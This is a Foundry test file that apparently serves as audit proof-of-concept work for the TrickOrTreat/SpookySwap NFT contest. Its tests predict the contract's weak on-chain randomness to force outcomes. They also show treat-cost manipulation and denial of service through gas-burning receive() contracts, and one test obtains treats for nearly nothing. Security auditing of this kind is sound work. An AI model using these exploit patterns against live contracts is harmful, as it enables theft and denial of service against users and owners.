// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "./../../../../src/codehawks/first-flights/trick-or-treat/TrickOrTreat.sol";

contract TrickOrTreatTest is Test {
    SpookySwap protocol;
    address user = makeAddr("user");
    address user2 = makeAddr("user2");

    event TreatAdded(string name, uint256 cost, string metadataURI);
    event Swapped(address indexed user, string treatName, uint256 tokenId);

    function setUp() public {
        vm.deal(user, 10 ether);
        vm.deal(user2, 1 ether);

        SpookySwap.Treat[] memory treats;
        protocol = new SpookySwap(treats);
    }

    function testDeploysSettingInitialTreats(SpookySwap.Treat[] memory treats) public {
        SpookySwap _protocol = new SpookySwap(treats);
        uint256 addedTreats = (_protocol.getTreats()).length;
        assertEq(addedTreats, treats.length);
    }

    function testLackOfZeroCostVerification() public {
        vm.expectEmit();
        emit TreatAdded("candy", 0, "");
        protocol.addTreat("candy", 0, "");

        vm.expectRevert(bytes("Treat must cost something."));
        protocol.setTreatCost("candy", 1 ether);

        vm.expectRevert(bytes("Treat cost not set."));
        protocol.trickOrTreat{ value: 0.1 ether }("candy");
    }

    function testTreatCostManipulation() public {
        protocol.addTreat("candy", 1 ether, "");

        uint256 nextTokenId = protocol.nextTokenId();
        uint256 random;
        //Prdict randomness as 2 so that Pending path get's hit
        while (true) {
            uint256 timestramp = block.timestamp;
            random = uint256(keccak256(abi.encodePacked(timestramp, address(user), nextTokenId, block.prevrandao))) % 1000 + 1;
            if (random == 2) {
                break;
            }
            vm.warp(timestramp + 1);
        }

        vm.prank(user);
        //Initial Cost 1 ether
        protocol.trickOrTreat{ value: 0.1 ether }("candy");

        //Owner Update
        protocol.setTreatCost("candy", 2 ether);

        //pendingPayment: 2 * cost - pendingNFTsAmountPaid
        //pendingPayment: 2 * 1 ether - 0.1 ether = 1.9 ether;
        vm.expectRevert(bytes("Insufficient ETH sent to complete purchase"));
        vm.prank(user);
        protocol.resolveTrick{ value: 1.9 ether }(nextTokenId);
        //Now user is supposed to pay much more than it should have
    }

    function testTreatOverrides() public {
        protocol.addTreat("candy", 0.1 ether, "uri1");
        protocol.addTreat("candy", 0.2 ether, "uri2");
        uint256 tokenId3 = protocol.nextTokenId();
        protocol.addTreat("candy", 0.3 ether, "uri3");
        //confirm 3 treats were added
        uint256 treats = (protocol.getTreats()).length;
        assertEq(treats, 3);
        //update latest "candy token"
        protocol.setTreatCost("candy", 0.5 ether);
        //token 1 and 2 are not accesible by no means
        (string memory name, uint256 cost,) = protocol.treatList("candy");

        assert(cost == 0.5 ether && Strings.equal(name, "candy"));
        //TrickOrTreat are applied to latest candy
        vm.prank(user);
        //Buy candy "will purchase third"
        protocol.trickOrTreat{ value: 1 ether }("candy");

        string memory uri = protocol.tokenURI(tokenId3);
        assert(Strings.equal(uri, "uri3"));
    }

    function testSameMetadaForMultipleTokenIds() public {
        protocol.addTreat("candy", 0.1 ether, "uri1");
        uint256 tokenId1 = protocol.nextTokenId();
        vm.prank(user);
        protocol.trickOrTreat{ value: 0.2 ether }("candy");

        uint256 tokenId2 = protocol.nextTokenId();
        vm.prank(user2);
        protocol.trickOrTreat{ value: 0.2 ether }("candy");

        string memory metadata1 = protocol.tokenURI(tokenId1);
        string memory metadata2 = protocol.tokenURI(tokenId2);

        assert(Strings.equal(metadata1, metadata2));
    }

    function testDOSonWithdrawFees() public {
        Owner owner = new Owner();

        SpookySwap.Treat memory treat = SpookySwap.Treat("candy", 0.1 ether, "ipfs://candy-cid");
        SpookySwap.Treat[] memory treats = new SpookySwap.Treat[](1);
        treats[0] = treat;

        vm.prank(address(owner));
        SpookySwap _protocol = new SpookySwap(treats);

        vm.prank(user);
        _protocol.trickOrTreat{ value: 0.2 ether }("candy");

        vm.prank(address(owner));
        vm.expectRevert();
        _protocol.withdrawFees();
    }

    function testInefficientRepayment() public {
        protocol.addTreat("candy", 0.1 ether, "uri1");

        BadBuyer buyer = new BadBuyer();
        vm.deal(address(buyer), 1 ether);
        vm.prank(address(buyer));
        vm.expectRevert();
        protocol.trickOrTreat{ value: 0.2 ether }("candy");
    }

    function testDOSonPendingMechanism() public {
        protocol.addTreat("candy", 1 ether, "uri1");
        uint256 tokenId = protocol.nextTokenId();
        uint256 random;
        while (true) {
            uint256 timestramp = block.timestamp;
            random = uint256(keccak256(abi.encodePacked(timestramp, address(user), tokenId, block.prevrandao))) % 1000 + 1;
            if (random == 2) {
                break;
            }
            vm.warp(timestramp + 1);
        }

        vm.prank(user);
        vm.expectEmit();
        emit Swapped(address(user), "candy", tokenId);
        //call with zero value
        protocol.trickOrTreat{ value: 0 }("candy");
    }

    function testTreatsAt1WeiForFree() public {
        protocol.addTreat("candy", 1 wei, "uri1");

        uint256 nextTokenId = protocol.nextTokenId();
        uint256 random;
        while (true) {
            uint256 timestramp = block.timestamp;
            random = uint256(keccak256(abi.encodePacked(timestramp, address(user), nextTokenId, block.prevrandao))) % 1000 + 1;
            if (random == 1) {
                break;
            }
            vm.warp(timestramp + 1);
        }

        uint256 balanceBefore = address(user).balance;
        vm.prank(user);
        protocol.trickOrTreat{ value: 1 ether }("candy");

        assert(address(user).balance == balanceBefore);
    }
}

contract BadBuyer {
    uint256 val;

    receive() external payable {
        //100
        while (gasleft() > 0) {
            val = type(uint256).max;
        }
    }
}

contract Owner {
    uint256 val;

    receive() external payable {
        uint256 gas = gasleft();
        uint256 consumed;
        //100
        while (consumed <= 2300) {
            val = type(uint256).max;
            consumed += gas - gasleft();
            gas = gasleft();
        }
    }
}
